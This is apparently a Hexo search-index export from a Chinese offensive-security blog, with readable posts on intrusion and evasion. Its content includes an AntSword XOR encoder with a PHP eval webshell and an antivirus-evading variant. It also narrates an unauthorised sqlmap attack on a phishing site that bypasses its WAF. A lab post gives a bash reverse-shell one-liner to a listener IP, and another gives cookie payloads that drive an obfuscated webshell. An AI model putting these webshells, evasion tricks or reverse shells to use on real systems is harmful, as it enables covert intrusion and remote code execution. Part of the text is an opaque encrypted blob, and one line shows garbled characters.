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]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(二)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-2%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MSF免杀360+火绒上线(一)]]></title>
    <url>%2Fposts%2Fshellcode-bypass-360-1%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于随机Cookie的蚁剑动态秘钥编码器]]></title>
    <url>%2Fposts%2Fantsword-xor-encoder-2%2F</url>
    <content type="text"><![CDATA[前言在上一篇蚁剑实现动态秘钥编码器解码器中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。但是在实际使用的过程中还是会出现各种各样的玄学BUG，导致利用失败，我个人不是特别满意。研究了一下蚁剑编码器的ext参数后，决定采用利用随机Cookie来产生随机秘钥的方式。正文编码器的ext参数本来一直等蚁剑作者写编码器的第三篇，结果一直没等到。。。算了还是自己研究一下吧首先新建一个编码器，名字叫test吧加入一行console.log(ext.opts.httpConf);然后随便连接一个shell，打开开发者工具，可以看到已经打印出了我们所需要的信息包括shell请求的body跟headers头抓包看一下，headers头的结果跟抓包的结果是一致的那么我们能否从编码器中修改headers头呢我们在编码器中加入一行1ext.opts.httpConf.headers[&apos;User-Agent&apos;]=&apos;yzddMr6&apos;;可以看到我们已经成功修改了shell中UA的值。同理，我们也可以在编码器中对其他header头或者body进行修改。随机生成Cookie既然我们已经可以任意修改shell的请求信息，我们就可以把秘钥放在一个指定的headers字段里，shell获取后再对payload进行加解密。但是突然多出来一个奇奇怪怪的字段，长时间后就会变成waf识别的特征。那么有没有什么是变化的，并且很常见的headers头呢？我们就可以想到利用Cookie。参考蚁剑的aes编码器，它所采用的方法是人工首先访问shell生成一个sessionid，填入shell配置后作为后面通讯的秘钥。但是实际上因为我们已经可以控制cookie字段，我们完全可以在编码器中每次生成一个随机的cookie，这样就省去了人工操作的一步。有一个坑要注意，php的session id一般是26位的，所以我们最好也生成一个26位的秘钥，增强伪装性。（虽然可能并没有什么卵用）具体实现编码器12345678910111213141516171819202122232425&apos;use strict&apos;;//code by yzddmr6module.exports = (pwd, data, ext = &#123;&#125;) =&gt; &#123; let randomID = `x$&#123;Math.random().toString(16).substr(2)&#125;`; function xor(payload) &#123; let crypto = require(&apos;crypto&apos;); let key = crypto.createHash(&apos;md5&apos;).update(randomID).digest(&apos;hex&apos;).substr(6); ext.opts.httpConf.headers[&apos;Cookie&apos;] = &apos;PHPSESSID=&apos; + key; key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); //let payload=&quot;phpinfo();&quot;; let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for (let i = 0; i &lt; cipher.length; i++) &#123; cipher[i] = cipher[i] ^ key[i % 26] &#125; cipher = cipher.map(t =&gt; String.fromCharCode(t)).join(&quot;&quot;) cipher = Buffer.from(cipher).toString(&apos;base64&apos;); //console.log(cipher) return cipher; &#125; data[&apos;_&apos;] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); data[pwd] = `eval(base64_decode(&quot;$&#123;data[&apos;_&apos;]&#125;&quot;));`; data[pwd]=xor(data[pwd]); delete data[&apos;_&apos;]; return data;&#125;Shell原型12345678&lt;?php@$post=base64_decode($_REQUEST[&apos;test&apos;]);$key=@$_COOKIE[&apos;PHPSESSID&apos;];for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%26];&#125;@eval($post);?&gt;免杀处理1234567891011121314151617&lt;?phpclass Cookie&#123; function __construct() &#123; $key=@$_COOKIE[&apos;PHPSESSID&apos;]; @$post=base64_decode($_REQUEST[&apos;test&apos;]); for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%26]; &#125; return $post; &#125; function __destruct() &#123;return @eval($this-&gt;__construct());&#125;&#125;$check=new Cookie();?&gt;连接测试最后还是老问题，蚁剑的其他参数只是一层base64，这个就需要大家自己手工去改了。蚁剑牛逼！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入“万能”Bypass]]></title>
    <url>%2Fposts%2Fbypass-waf-sqlin%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过宝塔云锁注入钓鱼站]]></title>
    <url>%2Fposts%2Fbypass-waf-and-hack-fish-site%2F</url>
    <content type="text"><![CDATA[前言某天收到一封邮件一看就是钓鱼邮件，并且我也不玩LOL。看了看感觉这个系统好像见过很多次，研究了一下，顺手日了下来过程比较有意思，遇到了不少坑，写篇文章记录一下。正文信息搜集打开网站首先我们可以看到他的炫酷界面进一步搜集信息发现有宝塔+云锁，找不到后台，旁站全是这种钓鱼站，均使用了冒充官网的子域名前缀手工试了下发现有注入，但是有云锁万能Bypass还是利用星球里提过的方法来bypass构造好post包后用sqlmap跑，发现有布尔盲注本来以为就要完事了，结果sqlmap最后提示注入失败emmmmmm，看一下发现被封了IP换个IP后，增大delay的数值，想了想他有可能是根据XFF来判断来源IP的，就又加了个tamper=xforwardedfor.py哈，本来可高兴了，以为完事了结果发现跑不出来数据exm???遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。花了一下午时间才一个一个解决第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里相当于一直发送的都是没有payload的数据包，所以肯定注不出来。具体原因不知道为什么，但是可以做一个猜想：可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了解决办法就是减小数据包长度，然后抓包调整最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去解决办法就是换kali。第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex柳暗花明解决完上面的坑后，终于可以出数据了跑了漫长的一个小时。。。终于跑出来了当前的用户名。。。然后是跑表名因为跑起来实在太慢了，后面就懒得跑了。最后面对这种邮件大家要提高警惕，一定要检查发件人跟域名是否是官方。一旦遇到钓鱼邮件立马举报，防止更多的人上当。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反弹Shell升级为交互式Shell]]></title>
    <url>%2Fposts%2Fshell-to-tty%2F</url>
    <content type="text"><![CDATA[前言看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。然后一顿操作把一个简单的shell就升级到了一个标准交互式shell写这篇文章记录一下正文攻击机：kali靶机：ubuntu首先ubuntu建一个新用户：test，密码 test普通Shell给kali弹shell1bash -i &gt;&amp; /dev/tcp/192.168.145.128/4444 0&gt;&amp;1kali1nc -lvvp 4444然后发现这个shell有很多问题无法使用vim等文本编辑器不能补全不能su没有向上箭头使用历史等等半交互式Shell对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：1python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;在创建完成后，我们此时就可以运行su命令了但是还是存在很多问题无法使用vim等文本编辑器不能补全没有向上箭头使用历史完全交互式Shell命令：1234567$ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ctrl-Z$ stty raw -echo$ fg$ reset$ export SHELL=bash//$ export TERM=xterm-256color此时已经拥有了一个完全交互式Shell，就可以使用上下左右，vi，tab补全等等一系列操作，并且按Ctrl-c也不会退出。相关命令解析1234567891011121314151617stty -echo #禁止回显，当在键盘上输入时，并不出现在屏幕上stty echo #打开回显stty raw #设置原始输入stty -raw #关闭原始输入bg将一个在后台暂停的命令，变成继续执行fg将后台中的命令调至前台继续运行jobs查看当前有多少在后台运行的命令ctrl + z可以将一个正在前台执行的命令放到后台，并且暂停clear这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。 reset这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空参考链接https://www.freebuf.com/news/142195.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[某Shell分析以及自己的一些想法]]></title>
    <url>%2Fposts%2Fan-interesting-shell%2F</url>
    <content type="text"><![CDATA[前言123&lt;?php$p=$_COOKIE;(count($p)==23&amp;&amp;in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&amp;&amp;($p[91]=$p[59]($p[91]))&amp;&amp;($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p()):$p;?&gt;星球里有很多同学想让我对这个shell写一篇解析，看了下确实比较有意思，并且顺便也想讲一些自己的想法。语法分析比较复杂的样子，一点点看吧。首先pç­ä»·äºcookie数组，属性是一个array。后面一长串其实是个三段式第一部分：条件1(count($p)==23&amp;&amp;in_array(gettype($p).count($p),$p))也就是说$p这个字典的长度要必须是23，并且gettype($p).count($p)拼接后的值必须在$p这个字典里。因为$p是array，count($p)=23，所以也就是说cookie中必须有一个值是array23第二部分：条件成立时执行1(($p[59]=$p[59].$p[72])&amp;&amp;($p[91]=$p[59]($p[91]))&amp;&amp;($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p())注意这里已经出现了变量函数的部分了 ,这两句将是后面讲的重点$p[59]($p[91]) 可以变为 assert($_POST['cmd'])等等$p=$p[91]($p[90],$p[59]($p[31])) 可以变为create_function('',eval($_POST[cmd]))等等第三部分：条件不成立时执行这部分没卵用。Payload这是某论坛大佬给出的payload可以看到是相当于拼接了一个eval(strrev(倒置的create_function(,eval($_POST[cmd]))))(差不多这个意思)然后就可以用密码是cmd的一句话连接了。但是想一想，因为里面有大量的可控参数，所以其实有很多玩法。举几个例子最短的用法，91处直接写命令为了方便我把$p给var_dump了出来1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=phpinfo();还可以通过GET传参1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_GET[a]);当然也可以改成POST，用蚁剑连接1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_POST[a]);直接在cookie里明文出现@eval($_POST[a]);肯定是不太好的，容易被拦截。我们别忘了第二处出现变量函数的地方1($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p())这里可以满足我们的各种编码需求。论坛中的payload是用strrev函数编码过的，也就是字符串反转，我们当然也可以用其他的比如base641Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 31=ZXZhbChwaHBpbmZvKCkpOw==; 90; 59=base64_; 72=decode; 91=Y3JlYXRlX2Z1bmN0aW9u;其中31是eval(phpinfo()); 91是create_function转化成蚁剑能够连接的一句话也就是把31处改为eval($_POST[cmd]);的base64编码，注意这里最后一定要加分号。然后用蚁剑连接就可以了。反思扩展总结一下这个shell构思的巧妙之处shell没有明显的eval assert $_POST 